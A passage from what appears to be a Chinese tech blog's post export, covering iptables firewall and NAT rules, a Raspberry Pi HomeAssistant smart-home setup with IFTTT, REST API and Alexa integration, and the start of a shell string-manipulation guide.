OUTPUT DROP ​ iptables -P FORWARD DROP ​ 状态检测：是一种显式扩展，用于检测会话之间的连接关系的，有了检测我们可以实现会话间功能的扩展 什么是状态检测？对于整个TCP协议来讲，它是一个有连接的协议，三次握手中，第一次握手，我们就叫NEW连接，而从第二次握手以后的，ack都为1，这 是正常的数据传输，和tcp的第二次第三次握手，叫做已建立的连接（ESTABLISHED）,还有一种状态，比较诡异的，比如：SYN=1 ACK=1 RST=1,对于这种我们无法识别的，我们都称之为INVALID无法识别的。还有第四种，FTP这种古老的拥有的特征，每个端口都是独立的，21号和 20号端口都是一去一回，他们之间是有关系的，这种关系我们称之为RELATED。 所以我们的状态一共有四种： ​ NEW ​ ESTABLISHED ​ RELATED ​ INVALID 所以我们对于刚才的练习题，可以增加状态检测。比如进来的只允许状态为NEW和ESTABLISHED的进来，出去只允许ESTABLISHED的状态出去，这就可以将比较常见的反弹式木马有很好的控制机制。 对于练习题的扩展： 进来的拒绝出去的允许，进来的只允许ESTABLISHED进来，出去只允许ESTABLISHED出去。默认规则都使用拒绝 ​ iptables -L -n –line-number ：查看之前的规则位于第几行 ​ 改写INPUT ​ iptables -R INPUT 2 -s 172.16.0.0/16 -d 172.16.100.1 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT ​ iptables -R OUTPUT 1 -m state –state ESTABLISHED -j ACCEPT ​ 此时如果想再放行一个80端口如何放行呢？ ​ iptables -A INPUT -d 172.16.100.1 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT ​ iptables -R INPUT 1 -d 172.16.100.1 -p udp –dport 53 -j ACCEPT 练习题： 假如我们允许自己ping别人，但是别人ping自己ping不通如何实现呢？ 分析：对于ping这个协议，进来的为8（ping），出去的为0(响应).我们为了达到目的，需要8出去,允许0进来 在出去的端口上：iptables -A OUTPUT -p icmp –icmp-type 8 -j ACCEPT 在进来的端口上：iptables -A INPUT -p icmp –icmp-type 0 -j ACCEPT 小扩展：对于127.0.0.1比较特殊，我们需要明确定义它 ​ iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT ​ iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT SNAT和DNAT的实现由于我们现在IP地址十分紧俏，已经分配完了，这就导致我们必须要进行地址转换，来节约我们仅剩的一点IP资源。那么通过iptables如何实现NAT的地址转换呢？ 1.SNAT基于原地址的转换 基于原地址的转换一般用在我们的许多内网用户通过一个外网的口上网的时候，这时我们将我们内网的地址转换为一个外网的IP，我们就可以实现连接其他外网IP的功能。 所以我们在iptables中就要定义到底如何转换： 定义的样式： ​ 比如我们现在要将所有192.168.10.0网段的IP在经过的时候全都转换成172.16.100.1这个假设出来的外网地址： ​ iptables -t nat -A POSTROUTING -s 192.168.10.0/24 -j SNAT –to-source 172.16.100.1 ​ 这样，只要是来自本地网络的试图通过网卡访问网络的，都会被统统转换成172.16.100.1这个IP. ​ 那么，如果172.16.100.1不是固定的怎么办？ ​ 我 们都知道当我们使用联通或者电信上网的时候，一般它都会在每次你开机的时候随机生成一个外网的IP，意思就是外网地址是动态变换的。这时我们就要将外网地 址换成 MASQUERADE(动态伪装):它可以实现自动寻找到外网地址，而自动将其改为正确的外网地址。所以，我们就需要这样设置： ​ iptables -t nat -A POSTROUTING -s 192.168.10.0/24 -j MASQUERADE ​ 这里要注意：地址伪装并不适用于所有的地方。 2.DNAT目标地址转换 ​ 对于目标地址转换，数据流向是从外向内的，外面的是客户端，里面的是服务器端通过目标地址转换，我们可以让外面的ip通过我们对外的外网ip来访问我们服务器不同的服务器，而我们的服务却放在内网服务器的不同的服务器上。 ​ 如何做目标地址转换呢？： ​ iptables -t nat -A PREROUTING -d 192.168.10.18 -p tcp –dport 80 -j DNAT –todestination 172.16.100.2 ​ 目标地址转换要做在到达网卡之前进行转换,所以要做在PREROUTING这个位置上 控制规则的存放以及开启​ 注意：你所定义的所有内容，当你重启的时候都会失效，要想我们能够生效，需要使用一个命令将它保存起来 ​ 1.service iptables save 命令 ​ 它会保存在/etc/sysconfig/iptables这个文件中 ​ 2.iptables-save 命令 ​ iptables-save &gt; /etc/sysconfig/iptables ​ 3.iptables-restore 命令 ​ 开机的时候，它会自动加载/etc/sysconfig/iptabels ​ 如果开机不能加载或者没有加载，而你想让一个自己写的配置文件（假设为iptables.2）手动生效的话： ​ iptables-restore &lt; /etc/sysconfig/iptables.2 ​ 则完成了将iptables中定义的规则手动生效 总结​ Iptables是一个非常重要的工具，它是每一个防火墙上几乎必备的设置，也是我们在做大型网络的时候，为了很多原因而必须要设置的。学好 Iptables,可以让我们对整个网络的结构有一个比较深刻的了解，同时，我们还能够将内核空间中数据的走向以及linux的安全给掌握的非常透彻。我 们在学习的时候，尽量能结合着各种各样的项目，实验来完成，这样对你加深iptables的配置，以及各种技巧有非常大的帮助。 附加iptables比较好的文章： netfilter/iptables全攻略]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Iptables</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[智能家居实践(三):接入硬件]]></title>
    <url>%2Farticles%2Facf227f8.html</url>
    <content type="text"><![CDATA[目的终于到了这一临门一脚了。前面了解了这么多基础知识，这一篇，我们终于可以完成这最后一步了 ———— 接入硬件。 接入理论上市面上所有能接入 Wifi 用手机控制的电器都能用 HomeAssistant 控制。 比如我的硬件列表有：Yeelight, 小米多功能网关, 米家智能插座, sonoff开关，还有 ESP8266 模拟 Wemo Switch，最后还有一个神器 BroadLink。 Yeelight 接入。文档在这里，配置很简单 12345678910light: - platform: yeelight devices: 192.168.1.25: name: Living Room transition: 1000 use_music_mode: True (defaults to False) save_on_change: False (defaults to True) 192.168.1.13: name: Front Door light 系统关键字，指定这是一个控制灯的服务。然后指定你的灯是什么品牌，在 platform 处声明，注意 platform 前面的横杠 -，这在 YAML 语法里面表示数，也就是说你有其他品牌的灯就在下方写 - platform: other_brand_light 就可以了。回到 yeelight 的配置，devices 下面填上灯的 IP 地址，可以登录路由器管理页面查到，如果你有多个 yeelight，就写多个 IP，然后用 name 区分。配置好之后，重启 HA。你就能在管理页面看到 Light 这个板块了。 点击你灯的名字处，就会弹出操作板，然后你就可以随意控制了。 其他的 Wifi 设备也都是一个套路。 BroadLink 的使用 BroadLink 本质上是一个红外/频射发射器，他本来是通过学习红外码和频射信号，然后把手机作为一个超级遥控器控制其他电器使用的。但 HomeAssistant 已经集成了 BroadLink ，这让语音控制那些只能用红外/频射遥控的家电成为了可能。最常见的就是空调了。 相关文档在这里 1234567891011121314switch: platform: broadlink host: 192.168.10.250 mac: '34:ea:34:e3:95:da' friendly_name: "Kitten‘s Broadlink" switches: iqair: friendly_name: "iqair--" command_on: 'JgBQAAABKpMUEhMSExITEhMSExITEhMSEzYVNRQ3EzcUNRU2FDYUNhQSEzYUEhMSExITEhMSExITNhQSEzcTNhU2FDYTNxQ2FAAFIgABKUgVAA0FAAAAAAAAAAA=' command_off: 'JgBYAAABKpMTEhQRFBISEhQRFBISEhQSEzYUNxM2FDYUNhQ2FDcTNxQRFBEUEhISFBEUEhISFBITNhQ2FDYUNhQ2FDYUNhQ3EwAFIgABKUkUAAxdAAEqSBUADQU=' ac: friendly_name: "ac--" command_on: 'JgDKAJKQETYSExA2EjcQExESETcREhETEDYSEhETEDcRNxESETcQNhITEDcRNhE2EjYRNhI2ERMRNhETERIRExATERIRExA3ERIRExATETcQNxESERMQExE3EDcRNhETERIRNxE2EayQkRE2EhMQNxE2ERMREhE2EhIREhE3ERIRExA2EzURExE3EDYSEhE2EjYRNhI3EDYSNhETETYRExESERIRExESERIRNxESERMQExE2ETYSEhETEBMRNhE2EjcQExESETYSNRIADQUAAAAAAAAAAAAAAAAAAA==' command_off: 'JgDKAJGRETYSExA2EjcQExESETYSEhESETYSEhETEDYSNxATETYRExE2ETYSNhE2EhIRNhI2ETcREhETEBMREhE2ERMREhE3ETYRNxESERMQExESERMQExESERMQNxE2ETcRNxA3EauRkRE2EhIRNhI2ERMREhE3EBMREhE2EhIRExA2EjYRExE2ERMRNhE2EjYRNhISETcRNhE3ERIRExATERIRNhETERIRNhI2ETYSEhETEBMREhETEBMREhETEDcRNxA3ETYRNhIADQUAAAAAAAAAAAAAAAAAAA==' BroadLink 集成到了 Switch 下的一个 platform，也就是 HA 把你的家电作为了一个开关处理，这也意味我们只能控制家电的开、关状态，虽然不能像遥控器上进行更多操作，比如空调设定温度，电视选频道，但开和关绝对是最大的需求了。配置中 host 和 mac 都可以在路由器的管理页面找到，重点我们看 switches 字段的配置。 switches 下面就是你所有的设备。每个设备都有 friendly_name，commandon*，command***off** 三个属性。friendly_name 就是你给你的设备取的名字，commandon 和 commandoff 就是开和关对应的红外码或者频射码，这两个码如何获得呢？ 我们来到 HA 控制页面,选择 Developer Tools 下的 Service 选项，在 Call a service from a component 的 Domain 下面选择 broadlink, Service 选择 learncommand19216810_250，然后点击CALL SERVICE。 不出意外，你的 Broadlink 亮起了橙色的灯，标记正处于学习状态，下一步你要做的就是拿起遥控器，比如我现在要学习空调开的红外码，我就对准 Broadlink 按下空调遥控板上“开”的按钮。 当橙色灯熄灭了，就表示学习成功了。然后前往 Developer Tools 下的 States，在这里你会发现 Recieved packet is: 后面跟着一长串字母和数字，那就是你刚才按下按钮的红外码了。 复制这一串红外码到配置文件中的 command_on 或者 command_off，如果你按的是 开，就把开的红外码复制到 command_on，其他我就不说了。 重启 HA ，你就能在控制页面看到了。HA 的控制页面不仅仅可以桌面上看，手机上也可以哦。 Broadlink 真是个好东西，它的意义在于让一些老家电可以毫不费力地摇身一变成智能设备，进而实现语音控制。 说到语音控制，上面已经接入了这么多家电，都是用 HomeAssistant 的控制页面进行控制，说好的 Amazon Echo 语音控制呢？别急，我们这就开始配置 Amazon Echo 服务。 Alexa / Amazon Echo 的文档在这里, 但是这个文档是介绍如何在 Echo 上自己创建一个能让 HA 识别 Skill，对我们没有作用，我们需要的仅仅是让 Echo 开关设备就行了，所以你应该看Emulated Hue Bridge 这个服务。 顾名思义，Emulated Hue Bridge 就是把你的电器模拟成 Hue Bridge，而 Hue Bridge 是 Amazon Echo 官方支持的设备。所以就能实现 Echo 控制你的家电了，看到这个原理，是不是醍醐灌顶，真是巧妙啊。 Hue Bridge 的最简单只要配置两个参数就能运行了。 123emulated_hue: type: alexa host_ip: 192.168.10.200 重启 HA，通过 Amazon Echo 的官方 App ———— Alexa 就能扫描到所有设备了。 由于 Emulated Hue Bridge 默认是把所有开关都模拟了，所以你的 Echo 能识别出一些不是硬件的服务，比如 check config, restart hass…. 这些都是我设置的其他服务，由于也是开关，所以都被 Emulated Hue Bridge 给模拟了。解决办法就是 homeassistant 这个服务下的 customize 里通过 emulated_hue: false 手动进行忽略。 12345homeassistant: customize: light.bedroom_light: emulated_hue: false emulated_hue_name: "back office light" 如果 Alexa 的 Your Devices 里面出现你的家电，也就意味着你已经可以用语音控制你的家电了。只是，你得说英文。]]></content>
      <categories>
        <category>智能工程</category>
      </categories>
      <tags>
        <tag>Ai</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[智能家居实践(二):初识HomeAssistant]]></title>
    <url>%2Farticles%2Ffe97d7ea.html</url>
    <content type="text"><![CDATA[目的这一篇我们要开始学习使用 HomeAssistant 了。在此之前，为了更方便地写代码，我们还需要做一些准备工作。 开启 Samba还记得上一节中我们使用的 FTP 软件吗？你可以在 /home/pi/hassbian-scripts 这个目录下找到一些已经预装好的脚本，如果没有，可以以 pi 的身份 clone 这个 repo : 1git clone https://github.com/home-assistant/hassbian-scripts.git 然后运行 1sudo ./hassbian-scripts/install_samba.sh 大概5分钟左右的安装时间。安装完你可以看到下面的界面： 然后在 Finder 的共享下面看到树莓派开放的服务器了。这样的好处是，你可以像访问本地的文件一样访问树莓派上的文件了。 然后就可以用 Sublime Text 打开这个目录开始编辑了： Configuration.yaml集成的所有服务可以在 Components 页面搜索。 接下去我们的所有工作都是在 Configuration.yaml 这个文件里完成。 HomeAssistant 的配置文件是 Yaml 写的，每个字段都表示一个服务，比如 homeassistant:,introduction,http,sun,sensor …. 等都是 HomeAssistant 内建好的服务。一般来说，你需要什么服务就添加什么服务，重启 HA 即可在控制页面看到新添加的服务了。 凡是改动了 Configuration.yaml 配置文件，都需要重启 HomeAssistant 服务才能生效。你可以使用命令重启， 1sudo systemctl restart home-assistant.service 也可以在管理界面重启 举些例子：homeassistant 文档这个服务下面提供一些全局的信息配置。latitude 和 longitude 字段填入自己所在位置的经纬度，方便一些需要用到经纬度的服务准确获取信息，比如 sunrise 服务就可以准确获取你当前位置的日出日落时间；unit_system 使用英制单位还是公制单位；time_zone 你的时区…. automation 文档这是一个内置的自动机，类似 IFTTT，都是当满足条件时触发操作，但 automation 的操作空间比 IFTTT 大的多，他不仅可以设置多个条件，还有触发一系列操作。 automation 由三部分组成： trigger – When Paulus arrives home condition – and it is after sunset: action – Turn the lights in the living room on 举个我使用的例子： HomeAssistant 服务启动时候用 IFTTT 给我推送一条推送： 12345678automation 1: alias: 'Startup Notification' trigger: - platform: event event_type: homeassistant_start action: - service: ifttt.trigger data: &#123;"event":"homeassistant_start", "value1":"Home Assistant 已启动"&#125; 其中 trigger 的 platform 字段必须制定一个值， event(事件总线) 是 HA 内建的一个 platform ，任何服务都可以获取和监听系统事件总线的事件，比如 HOMEASSISTANT_START , HOMEASSISTANT_STOP , SERVICE_REGISTERED …. 我在上面的 automation 里监听了 HA 启动的事件，没有 condition ,直接触发 action，action 的 service 也必须指定一个服务。 notify 文档这就是 HA 的推送服务了，基本你能想到的和你想不到的 platform 都已经集成进来了，具体请看文档。比如我用的是 pushbullet。 1234notify: - name: notify platform: pushbullet api_key: xxxxx 一旦配置了这个服务，就可以在其他服务里调用它了。比如在我们之前提到的 automation 里面就可以使用： 123456789101112automation 3: - alias: Send message at lunch time trigger: platform: time hours: 12 minutes: 15 seconds: 0 action: service: notify.notify data: message: '该吃午饭了' title: '为了健康，请规律饮食！' 注意我这里的 action 就用了 notify.notify 来找到你在其他地方配置的这个 notify 服务。 IFTTT 文档12ifttt: key: xxxxx-x-xxxxxxxxxxxxx IFTTT 的配置很简单，就只要配一个 key 就行，key 需要在 Maker Channel 里生成。接下来我们来看看如果配合 IFTTT 使用 HomeAssistant。 首先新建一个 Applet， this 选择 Maker Webhooks,选择 Receive a web request，然后给事件取一个名字。 之后在 HomeAssistant 里面就可以通过这个名字触发这条 IFTTT 了。在此之前，我们先把下面的 that 步骤完成，为了直观地看到测试效果，我们选择 Notifications - Send a notification from IFTTT app 这里有很多 Ingredient 占位符， EventName 就是之前我们给事件声明的名字，Value1,Value2,Value3 我们可以在 HA 里面自己传过去，OccurredAt 就是发生的时间。 创建完成这条 Applet 之后，我们就可以开始用 HA 来触发了。触发的方式就太多了。 1.最简单的，在我们的管理界面： event 字段后面就跟我们之前填写的事件的名称，后面的 Value1,2,3 对应之前 IFTTT 里的参数。然后点击 CALL SERVICE ，不出意外就可以在几秒钟之后看到 IFTTT 给你推送了一条消息。 2.其次我们还可以在 automation 里的 action 中触发 123action:- service: ifttt.trigger data: &#123;"event":"HA_Start", "value1":"Home Assistant 已启动"&#125; 3.RESTful API 这真的是个强大功能。这意味着我们可以像调用普通 API 一样调用 HomeAssistant 的所有服务。由于太过强大，我另起一节介绍。 4. RESTful API 文档 和普通的 RESTful API 一样， HA 的 RESTful API 也是返回的 JSON 格式，另外，如果你配置了HTTP 这个服务并设置了密码（这个密码就是你登录控制面板的密码，推荐这么做），那么你只需要在调用 API 的时候传入密码参数即可。 具体 API 请大家看文档，我仅介绍比较常用的以做示范。 GET /api/services – 获取当前可用的所有服务 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136[ &#123; "domain": "ifttt", "services": &#123; "trigger": &#123; "description": "", "fields": &#123;&#125; &#125; &#125; &#125;, &#123; "domain": "switch", "services": &#123; "toggle": &#123; "description": "Toggles a switch state", "fields": &#123; "entity_id": &#123; "description": "Name(s) of entities to toggle", "example": "switch.living_room" &#125; &#125; &#125;, "turn_off": &#123; "description": "Turn a switch off", "fields": &#123; "entity_id": &#123; "description": "Name(s) of entities to turn off", "example": "switch.living_room" &#125; &#125; &#125;, "turn_on": &#123; "description": "Turn a switch on", "fields": &#123; "entity_id": &#123; "description": "Name(s) of entities to turn on", "example": "switch.living_room" &#125; &#125; &#125; &#125; &#125;, &#123; "domain": "light", "services": &#123; "toggle": &#123; "description": "Toggles a light", "fields": &#123; "entity_id": &#123; "description": "Name(s) of entities to toggle", "example": "light.kitchen" &#125;, "transition": &#123; "description": "Duration in seconds it takes to get to next state", "example": 60 &#125; &#125; &#125;, "turn_off": &#123; "description": "Turn a light off", "fields": &#123; "entity_id": &#123; "description": "Name(s) of entities to turn off", "example": "light.kitchen" &#125;, "flash": &#123; "description": "If the light should flash", "values": [ "short", "long" ] &#125;, "transition": &#123; "description": "Duration in seconds it takes to get to next state", "example": 60 &#125; &#125; &#125;, "turn_on": &#123; "description": "Turn a light on", "fields": &#123; "brightness": &#123; "description": "Number between 0..255 indicating brightness", "example": 120 &#125;, "color_name": &#123; "description": "A human readable color name", "example": "red" &#125;, "color_temp": &#123; "description": "Color temperature for the light in mireds (154-500)", "example": "250" &#125;, "effect": &#123; "description": "Light effect", "values": [ "colorloop", "random" ] &#125;, "entity_id": &#123; "description": "Name(s) of entities to turn on", "example": "light.kitchen" &#125;, "flash": &#123; "description": "If the light should flash", "values": [ "short", "long" ] &#125;, "profile": &#123; "description": "Name of a light profile to use", "example": "relax" &#125;, "rgb_color": &#123; "description": "Color for the light in RGB-format", "example": "[255, 100, 100]" &#125;, "transition": &#123; "description": "Duration in seconds it takes to get to next state", "example": 60 &#125;, "white_value": &#123; "description": "Number between 0..255 indicating level of white", "example": "250" &#125;, "xy_color": &#123; "description": "Color for the light in XY-format", "example": "[0.52, 0.43]" &#125; &#125; &#125; &#125; &#125;] 你实际的 JSON 内容一定比我上面的要多，因为我删了一些不常用，留下精华做示范。可以看到最外面是个数组，每个元素都是一项服务，我留下了 ifttt,switch,light，之所以会出现三个服务，就是因为你在 Configuration.yaml 里面添加了这三个服务。根据上面返回的信息，我们可以写出调用 IFTTT 服务的 API 如下： API: http://YOUR_IP_ADDRESS:8123/api/services/ifttt/trigger?api_password=YOUR_PASSWORD (YOUR_IP_ADDRESS 可以是局域网IP，也可以是域名) Method: POST Content-Type: application/json Params: {&quot;event&quot;: &quot;homeassistant_start&quot;, &quot;value1&quot;: &quot;来自的 RESTful API 的推送&quot;} 这里推荐一个 Mac 上我常用的测试 API 的工具 —— Cocoa Rest Client. 显示 HTTP 200 No Error 说明没有问题，接下来的几秒内你就会收到一条推送了。现在，你是不是和我一样觉得神奇之余还有一丝成就感。 更进一步，你看到我上面还有 ‘light’ 和 ‘switch’ 这两个服务，这些是因为我配置了硬件相关的服务后出现的，这也就意味着你可以用 API 来控制你的电视，空调，灯泡灯一切电器。 例如通过 API 开启空气净化器： 通过 API 开启 Yeelight智能灯泡并切换到指定颜色和亮度： 比如我还写了一个 Shell 脚本每天早晨8点自动运行，通过 API 获取 World Air Quality Index 的空气质量数据，如果 PM2.5大于50就通过 API 让床头灯颜色显示红色，否则显示绿色，这样我早上醒来一看床头灯的颜色就知道今天要不要带口罩了。 1234567891011121314#!/bin/bash# get AQI MY_VAR="$(curl https://api.waqi.info/feed/shanghai/?token=xxxxxxxx | jq "&#123;aqi: .data.aqi, pm25: .data.iaqi.pm25.v, pm10: .data.iaqi.pm10.v&#125;")" echo $MY_VARpm25="$(echo $MY_VAR | jq ".pm25")" if [[ $pm25 -gt 50 ]]; then echo "PM2.5 大于50" curl -X POST -H 'x-ha-access: xxxxx' \ -H 'Content-Type: application/json' \ -d '&#123;"color_name":"red","brightness":"190"&#125;' \ http://IP_ADDRESS:8123/api/services/light/turn_on?api_password=PASSWORD \ fi 想到平时一直接触的 API 竟然可以用来控制你的电器，是不是又一次感觉不可思议。这一切，都归功于 HomeAssistant 这个成熟的开源社区，再次表达敬佩和感谢之情。 其实当 IFTTT 的 Maker Webhooks 作为 that 部分的时候，也可以充当调用 API 的发起方（Make a web request）。比如我的一条 IFTTT 是：当我到家的的时候自动开启所有电器。这里面 Maker Webhooks 作为了 that 部分就可以发起一个 HTTP Request 了。 至此，通过 API 实现了 IFTTT 和 HA 全部打通，两者既可以作为主动发起方，也可以作为被动执行方，简言之，你可以让 HA 触发一条 IFTTT，IFTTT 再触发硬件，也可以 IFTTT 触发 HA 的 automation，automation 再触发其他操作….. 总之已经可以结合出无数多的可能性，限制你的只有你的想象力。 好啦，下一篇文章，我们要开始接入硬件了，要知道我前面铺垫了这么久，最终要实现的功能还是用 Amazon Echo 和 Siri 控制所有家电啊。]]></content>
      <categories>
        <category>智能工程</category>
      </categories>
      <tags>
        <tag>Ai</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[智能家居实践(一):树莓派的配置]]></title>
    <url>%2Farticles%2Fece79d2c.html</url>
    <content type="text"><![CDATA[背景某天我像往常一样逛知乎，突然就看到了一篇文章，文章内容是“马克扎克伯格自己打造的智能家庭 AI — Javals”，我相信看过这篇文章或者知道这个报道的人肯定不少。我当时也没觉得我自己也能打造一个 AI 系统，因为小扎的一套完全从改装硬件电路到中央服务器都是自己实现，我没那么大本事，但我当时正好沉迷于效率软件 IFTTT、Workflow、Alfred，其中我发现 IFTTT 里面有很多 Applets 和硬件有关，这勾起了我的好奇心，我虽做不到小扎那样的工程，但能不能利用市面上现有的产品，打造一个类似的智能家居系统？ 首先我觉得，一个真正智能的家庭系统一定是时刻待命的，而不是当我需要的时候还得掏手机，然后按下一个按键或者把手机拿到嘴边进行语音控制。所以我一开始就明确了让 Amazon echo 作为前端，它是一个时刻待命的只需要你叫一声 Alexa 就能唤醒的设备，而且可以覆盖一个50平米的家庭，真正做到了时刻在你身边。 然后就是解决问题的常规套路：Google 搜索关键字 Hack,Amazon echo，经过一番信息筛选，我发现了一个普遍被大家提及的名词 — HomeAssistant。 HomeAssistant 是国外一个成熟的，开源的智能家居平台，这个平台的目的是把所有能通过 Wifi 控制的电器全部接入进来统一管理，这样你可以在手机、电脑上随时随地了解家里的情况并做出控制。 而好消息是， echo 也已经被黑客黑客攻克并且集成到了这里面，原理其实是把 HomeAssistant 上已经接入的设备伪装成 echo 能够识别的 Hue Bridge, 从而达到让 echo 控制普通电器的目的。 HomeAssistant介绍了那么多，我们让 HomeAssistant 先 run 起来吧。 我们完全可以在自己的电脑上运行 HomeAssistant 这个服务，但是考虑到这个这个服务需要像路由器一样24小时运行，对于这样的需求最理想的方案是把服务分出去到一个单独的硬件上运行，就像路由器一样，因此，体积小巧却五脏俱全的树莓派理所当然成了首选。 说到树莓派，它其实就是一台完整的计算机。连上显示器它就是一台电脑，通过 ssh 就是一台服务器，通过 smb 就是一台 NAS。下面我简单介绍一下当你买到一台树莓派之后你通常应该做什么。 安装系统推荐购买集成 WIFI 模块的树莓派 3B+。然后你需要一张被格式化成 FAT 格式且大于等于8G的 SD 卡。 HomeAssistant 真是个成熟的社区，他们甚至直接提供了内置 HomeAssistant 服务的 Raspbian 系统 —— Hassbian 。点击下载最新版本固件。 然后使用 Etcher 把下载好的系统刷入 SD 卡。 ssh 连接树莓派将 SD 卡插入树莓派，通电。如果你是第一次使用树莓派或者你换了张新卡，首先需要先将树莓派连上网线，然后前往路由器的 DHCP 找到树莓派的 IP 地址。 由于是动态分配的 IP，每隔一定时间 IP 就会自动分配不利于后续的使用，所以你需要给树莓派分配一个静态地址，比如我下面给树莓派分配了 192.168.10.222。重新连接网线既可更新。 然后你就可以用 ssh 连接你的树莓派了。下一步我们要让树莓派自动连接 WIFI，这样就可以彻底告别网线了。打开终端或者 iTerm，输入 1ssh pi@192.168.10.222 Hassbian 默认用户名 pi ,默认密码 raspberry。成功连上： 连上之后通过 passwd 命令修改默认密码。 自动连接 WIFI下面我们要让树莓派每次启动都可以自己连上 WIFI，就像我们平时使用的数码产品一样。回到命令行，输入： 1sudo iwlist wlan0 scan ` 以上命令可以找到所有可用网络，每一个 cell 表示一个可用网络。 通过 ESSID: 找到你要连接网络，记下名称，用 nano 工具配置 wifi 信息： sudo nano /etc/wpa_supplicant/wpa_supplicant.conf 在最下方填上 WIFI 信息： 1234network=&#123; ssid="XXXX" psk="XXXX" &#125; control+o 回车 control+x保存并退出编辑器。 重启树莓派 sudo reboot 至此，你可以拔掉你的网线了，你的树莓派已经可以自动连上WIFI。 域名解析＋ssh 免密码登录其实树莓派就是一台服务器，如果你自己买过服务器或者搭过网站的话一定会做的两件事就是 域名解析 和 ssh 免密码登录，前者可以让你用一个好记的域名而不是每次都输入一串 IP 地址并可以在外网访问到树莓派，后者为了每次 ssh 不用重复输密码。 首先你要知道自己的路由器的公网 IP，你可以分别前往路由器管理界面查看自己 WAN 口分配的 IP 和 ip.cn 查到的公网 IP 是否一致，一致的话说明你用的就是公网 IP，这个 IP 可以直接用来做解析，不一致的话你就需要动态域名解析了，你需要在树莓派上跑个脚本隔一段时间把公网 IP 更新到域名解析的地方。由于我是公网 IP，我就不演示动态域名解析的例子了，你可以在网上找到很多文章。[1] [2] 如果你已经有域名了，就可以去域名服务商 DNS 管理界面添加一条 A 记录，指向你的公网 IP。一般过半个小时域名就可以生效。如果你没有自己的域名，也有很多免费的域名提供商，比如 duckdns。域名配置好了，你还需要做最后一步，端口转发。 你从外网 ssh 访问路由器公网 IP 的 22 端口，如果不做端口转发，那么这个请求就无人认领而导致 time out，所以前往路由器管理界面，我刷的是 OpenWrt 的固件，在防火墙-端口转发里设置，这个功能绝大多数路由器都有，只不过名字不同而已，你仔细找找。 域名也解析好了，端口也转发好了，那么你就可以愉快地在世界任何一个地方通过 ssh pi@sub.domain.com 连接你的树莓派了。 ssh 免密登录也很简单，就是把 Mac 本地的公钥传到树莓派上。首先查看本地 Mac 上的公钥 ls ~/.ssh 如果存在 id_rsa.pub 或 id_dsa.pub ,直接 cat ~/.ssh/id_rsa.pub | ssh pi@192.168.x.x &#39;cat &gt;&gt; .ssh/authorized_keys&#39; 把公钥传到树莓派上就可以了。如果之前没有生成过秘钥对，那就生成一对： ssh-keygen -t rsa -C &lt;YourName&gt;@pi 然后重复上面的 cat &gt;&gt; 命令即可。 通过 SFTP 浏览系统文件涉及到浏览文件的操作，我推荐使用 FTP 的软件，原因就是直观，我使用的是 Transmit，你也可以使用其他免费的 FTP 软件。 你会发现 Hassbian 已经内置了 HomeAssistant 服务，相关文件都在 /home/homeassistant/.homeassistant 里，如果你看不到 .homeassistant 文件夹，需要手动开启显示隐藏文件。 如果还是没看到 .homeassistant，再等等，一般 Hassbian 需要 5-10 分钟下载 HomeAssistant 的相关服务，如果你不走运可能下到了假的 Hassbian,你可以手动更新 HomeAssistant。 123456$ sudo systemctl stop home-assistant@homeassistant.service$ sudo su -s /bin/bash homeassistant$ source /srv/homeassistant/bin/activate$ pip3 install --upgrade homeassistant$ exit$ sudo systemctl start home-assistant@homeassistant.service 如果出现了 .homeassistant 隐藏文件夹，那么你可以在浏览器输入 192.168.x.x:8123(192.168.x.x 是你树莓派的 IP)，你应该能看到 HomeAssistant 的控制界面了。这里有一条默认的规定是 HomeAssistant 默认是开在 8123 端口上的。 TA-DA! 这说明你的 HomeAssistant 服务已经开启。 和上面一样，如果你想在外网访问这个页面，只需要在路由器的端口转发设置页面再设置一条外网 8123 转树莓派 8123 的转发规则即可，这样你就可以在世界任何一个角落通过 sub.domain.com:8123 访问树莓派上的 HomeAssistant 服务了。 接下来的文章我将详细介绍 HomeAssistant 的使用。]]></content>
      <categories>
        <category>智能工程</category>
      </categories>
      <tags>
        <tag>Ai</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell替换和截取字符串详解]]></title>
    <url>%2Farticles%2F150d8700.html</url>
    <content type="text"><![CDATA[目的本文详细介绍了shell中替换和截取字符串等其他的妙用。 截断12345678910111213例子：file=/dir1/dir2/dir3/my.file.txt$&#123;file#*/&#125;: 拿掉第一条/及其左边的字符串：dir1/dir2/dir3/my.file.txt$&#123;file##*/&#125;: 拿掉最后一条/及其左边的字符串：my.file.txt$&#123;file#*.&#125;: 拿掉第一个.及其左边的字符串：file.txt$&#123;file##*.&#125;: 拿掉最后一个.及其左边的字符串：txt$&#123;file%/*&#125;: 拿掉最后条/及其右边的字符串：/dir1/dir2/dir3$&#123;file%%/*&#125;: 拿掉第一条/及其右边的字符串：(空值)$&#123;file%.*&#125;: 拿掉最后一个.及其右边的字符串：/dir1/dir2/dir3/my.file$&#123;file%%.*&#125;: 拿掉第一个.及其右边的字符串：/dir1/dir2/dir3/my记忆的方法为：#是去掉左边, ##最后一个%是去掉右边, %%第一个 [list]#是去掉左边, ##最后一个 ​ %是去掉右边, %%第一个 提取单一符号是最小匹配﹔两个符号是最大匹配。 12$&#123;file:0:5&#125;：提取最左边的 5 个字节：/dir1$&#123;file:5:5&#125;：提取第 5 个字节右边的连续 5 个字节：/dir2 替换12$&#123;file/dir/path&#125;：将第一个 dir 提换为 path：/path1/dir2/dir3/my.file.txt$&#123;file//dir/path&#125;：将全部 dir 提换为 path：/path1/path2/path3/my.file.txt 针对不同的变量状态赋值(没设定、空值、非空值)：123456789101112$&#123;file-my.file.txt&#125;: 若$file没有设定，则使用my.file.txt作返回值。(空值及非空值时不作处理)$&#123;file:-my.file.txt&#125;:若$file没有设定或为空值，则使用my.file.txt作返回值。(非空值时不作处理)$&#123;file+my.file.txt&#125;: 